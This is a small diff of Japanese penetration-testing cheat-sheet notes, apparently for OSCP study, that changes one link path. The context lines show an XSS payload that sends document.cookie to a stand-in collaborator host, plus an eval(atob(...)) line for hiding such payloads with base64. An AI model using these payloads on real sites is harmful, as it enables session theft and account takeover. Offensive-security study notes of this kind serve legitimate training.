@@ -18,7 +18,7 @@ fetch('https://COLLABORATOR_DOMAIN?c='+document.cookie)
 ```
 eval(atob("base64エンコードした上記2つのペイロード"))
 ```
-[Web攻撃の難読化](../../../OSCP/Cheatsheet/AV%20Evasion/Web攻撃の難読化.md#base64%20encoding)
+[Web攻撃の難読化](../../../OSCP/Cheatsheet/AV%20Evasion(範囲外)/Web攻撃の難読化.md#base64%20encoding)
 [🔍 Recon](../../cheatsheet/🔍%20Recon.md#⭐️URLエンコードについて)
 
 ---
